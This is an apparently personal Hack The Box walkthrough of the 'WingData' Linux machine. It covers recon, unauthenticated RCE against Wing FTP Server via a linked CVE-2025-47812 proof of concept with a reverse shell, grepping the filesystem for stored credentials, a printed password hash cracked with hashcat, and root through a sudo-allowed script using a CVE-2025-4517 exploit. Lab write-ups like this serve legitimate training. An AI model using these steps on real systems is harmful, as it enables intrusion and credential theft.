# Wingdata  | Hack-The-Box | Walkthrough

| Category          | Details               |
|----------         |---------              |
| Platform          | [HTB Wingdata](https://app.hackthebox.com/machines/WingData?sort_by=created_at&sort_type=desc)    |
| Difficulty        | Easy                  |
| Target machine    | Linux                 |
| Attacker Machine  | Kali linux            |
| Tools             | nmap, Hashcat, Python    |

# Reconnaissance

Scan the target machine to identify open ports and running services. 
```
nmap -A -T4 <ip address>
```
[Nmap Scan](../Hack-The-Box/images/wingdata/nmap-scan.png)

The initial Nmap scan identifies two open ports:
| Port      | Service       |
| --------- |---------------|
| 22/tcp    | ssh           |
| 80/tcp    | http          |


# Enumeration

The website homepage at `http://wingdata.htb/` presents a professional-looking website for Wing Data Solutions, featuring several company services and navigation options. <br>
Among the available navigation options, the Client Portal stands out as the most interesting from an attack surface perspective.<br>
Manual interaction with the application reveals that the Client Portal redirects to a separate subdomain:<br>
`http://ftp.wingdata.htb/`

[webpage](../Hack-The-Box/images/wingdata/webpage.png)

The link opens up to a login page for `Wing FTP Server Web Client`, which appeared to provide browser-based access to the FTP service. The portal required an account name and password, indicating that authenticated users could access and manage files directly through this interface.<br>
Inspecting the page discloses the underlying software and version:<br>
`Wing FTP Server v7.4.3`

Public research shows that `Wing FTP Server v7.4.3` is affected by `CVE-2025-47812`, an unauthenticated remote code execution vulnerability.

# Exploitation 
A public proof-of-concept exploit is available for [CVE-2025-47812](https://github.com/0xcan1337/CVE-2025-47812-poC.git) and can be used to obtain remote code execution.  

Download the exploit to the attacker machine and execute it against the target.
```
python CVE-2025-47812-poC.py

# target:- http://ftp.wingdata.htb/
# username:- anonymous
# reverse shell IP:- local-IP
# reverse shell port:- 4444 
(Ensure that a Netcat listener is running on the specified port before executing the exploit so the reverse shell can connect successfully.)
```

# Initial Access

Successful exploitation results in a reverse shell running as the wingftp user.

[Initial Access](../Hack-The-Box/images/wingdata/intial-access.png)

To improve shell usability upgrade the shell to a fully interactive TTY using Python:
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
Afrer gaining initial access as wingftp user, system enumeration identifies other user `wacky`<br>
The wingftp account lacks permission to access wacky's home directory, making credential recovery or lateral movement necessary.<br>

Search the filesystem for references to `wacky`, which may reveal configuration files or stored credentials.<br>
`grep -R "wacky" / 2>/dev/null`

This search uncovers a file named `wacky.xml` 

[wacky.xml](../Hack-The-Box/images/wingdata/wacky-xml.png)

The XML configuration file contains authentication data for the wacky account. Although the password is stored as a hash rather than plaintext, it is suitable for offline cracking.<br>
Although the password was stored as a hash rather than plaintext, it represented a valuable target for offline cracking or credential reuse attacks.<br>

Format the extracted hash appropriately for Hashcat by appending the `WingFTP` identifier expected by the corresponding hash mode.<br>
```
32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP

hashcat -m 1410 hash.txt /usr/share/wordlists/rockyou.txt
```

Hashcat successfully recovers the plaintext password, enabling lateral movement to the `wacky` account.

[hashcat](../Hack-The-Box/images/wingdata/hashcat-wacky.png)

Switch to the `wacky` user using the recovered credentials.

The user flag is located in `/home/wacky` directory 

# Privilege Escalation

Enumerate the user's `sudo` privileges:

[sudo -l](../Hack-The-Box/images/wingdata/sudo-l.png)

The sudo configuration allows execution of the following script as root without requiring a password:
```
(root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
```

Reviewing the script alone did not immediately reveal an obvious privilege escalation path.<br>
Additional research into the executable and its associated components uncovers a publicly documented vulnerability affecting this backup mechanism.

[automated script for CVE-2025-4517](https://github.com/AzureADTrent/CVE-2025-4517-POC.git) 

Executing the proof-of-concept successfully escalates privileges and provides a root shell.

[Root Access](../Hack-The-Box/images/wingdata/root-access.png)

[USER FLAG](../Hack-The-Box/images/wingdata/user-flag.png)

[ROOT FLAG](../Hack-The-Box/images/wingdata/root-flag.png)

Root flag & User Flag found!<br>
Hope this Writeup was fun, easy to follow and helpful to you.<br>

Happy Hacking ~!!!